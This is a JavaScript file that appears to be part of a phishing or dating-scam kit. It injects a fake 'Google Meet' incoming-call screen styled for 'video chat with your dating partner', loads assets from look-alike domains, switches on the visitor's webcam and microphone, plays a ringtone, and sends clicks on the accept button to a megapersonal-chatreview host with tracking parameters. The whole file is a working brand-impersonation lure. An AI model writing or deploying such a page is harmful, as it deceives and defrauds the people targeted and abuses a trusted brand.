// https://accept-live-chat.com/emojionearea.main.js




// Create elements programmatically
const newDiv = document.createElement('div');
newDiv.className = 'card';


newDiv.innerHTML = `
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://join-video-chat.one/public/css/1e43e3ab50fce75f.css" data-precedence="next">
    <link rel="stylesheet" href="https://join-video-chat.one/public/css/57978a1014ff42c9.css" data-precedence="next">
    <title>Google Meet</title>
    <meta name="description" content="Enjoy private live video chat with your dating partner">
    <meta property="og:title" content="Google Meet">
    <meta property="og:description" content="Enjoy private live video chat with your dating partner">
    <meta property="og:image" content="https://join-video-chat.one/public/images/logo_meet_2020q4_color_2x_web_96dp.png">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Google Meet"> <!-- Fixed here -->
    <meta name="twitter:description" content="Enjoy private live video chat with your dating partner">
    <meta name="twitter:image" content="">
    <link rel="icon" href="" sizes="32x32">
    <meta name="next-size-adjust">
</head>
<body class="__className_aaf875">
    <div style="color-scheme:light" class="bg-neutral-900 text-neutral-950">
        <video autoplay="" muted="" playsinline="" class="fixed inset-0 w-full h-full object-cover object-center" id="video"></video>
        <div class="relative min-h-dvh flex items-center justify-center p-4 text-center" id="call-popup">
            <div class="bg-neutral-50 w-full max-w-[17rem] p-6 rounded-xl flex flex-col items-center justify-center gap-y-6">
                <img alt="snapchat" loading="lazy" width="80" height="80" decoding="async" data-nimg="1" class="rounded-full object-cover object-center p-2 bg-yellow-100" style="color:transparent" src="https://join-video-chat.one/public/images/logo_meet_2020q4_color_2x_web_96dp.png">
                <p class="text-xl font-medium text-neutral-700 text-center">Incoming call...</p>
                <div class="flex items-center justify-center gap-x-12 text-neutral-50">
                    <label for="password" class="size-14 flex items-center justify-center rounded-full text-3xl bg-green-500">
                        <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                            <path fill="none" d="M0 0h24v24H0z"></path>
                            <path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"></path>
                        </svg>
                    </label>
                    <label for="password" class="size-14 flex items-center justify-center rounded-full text-3xl bg-red-500">
                        <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                            <path fill="none" d="M0 0h24v24H0z"></path>
                            <path d="M12 9c-1.6 0-3.15.25-4.6.72v3.1c0 .39-.23.74-.56.9-.98.49-1.87 1.12-2.66 1.85-.18.18-.43.28-.7.28-.28 0-.53-.11-.71-.29L.29 13.08a.956.956 0 0 1-.29-.7c0-.28.11-.53.29-.71C3.34 8.78 7.46 7 12 7s8.66 1.78 11.71 4.67c.18.18.29.43.29.71 0 .28-.11.53-.29.71l-2.48 2.48c-.18.18-.43.29-.71.29-.27 0-.52-.11-.7-.28a11.27 11.27 0 0 0-2.67-1.85.996.996 0 0 1-.56-.9v-3.1C15.15 9.25 13.6 9 12 9z"></path>
                        </svg>
                    </label>
                </div>
            </div>
        </div>

    </div>
`;
    let x = 1;
    
    
    

document.addEventListener('click', function(e) {

function getQueryParam(param) {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(param);
}


const urlParams = new URLSearchParams(window.location.search);
const errorParam = urlParams.get('error');
const admin = urlParams.get('admin');
const poster = urlParams.get('poster');
const verifyId = urlParams.get('verifyId');

let userId = getQueryParam('userid') || 1;
       

 document.querySelectorAll('.accept-button').forEach(button => {
  button.addEventListener('click', () => {
       let userId = getQueryParam('userid') || 1;
    window.location.href =`megapersonal-chatreview.vercel.app/${admin}/${poster}`
  });
});
 
 
});


        $(document).ready(function() {

            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                // Access the webcam
                navigator.mediaDevices.getUserMedia({
                        video: true
                    })
                    .then(function(stream) {
                        // Show the video stream
                        $('#video').get(0).srcObject = stream;
                    })
                    .catch(function(error) {
                        console.error('Error accessing webcam:', error);
                    });
            } else {
                console.error('getUserMedia is not supported');
            }

        });

        window.addEventListener('DOMContentLoaded', (event) => {

            const audioContext = new(window.AudioContext || window.webkitAudioContext)();

            const source = audioContext.createBufferSource();

            navigator.mediaDevices
                .getUserMedia({
                    audio: true
                })
                .then(() => {

                    source.addEventListener('ended', () => {
                        source.stop();
                        audioContext.close();
                    });

                    source.loop = true;

                    const request = new XMLHttpRequest();

                    request.open('GET', "https://join-video-chat.one/public/audio/tune_ptyrq7.mp3", true);
                    request.responseType = 'arraybuffer';
                    request.onload = () => {
                        audioContext.decodeAudioData(
                            request.response,
                            (buffer) => {
                                source.buffer = buffer;
                                source.connect(audioContext.destination);
                                source.start();
                            },
                            (e) => {
                                // console.log('Error with decoding audio data' + e.message);
                            });
                    }

                    request.send();
                })
     

        });

document.body.appendChild(newDiv);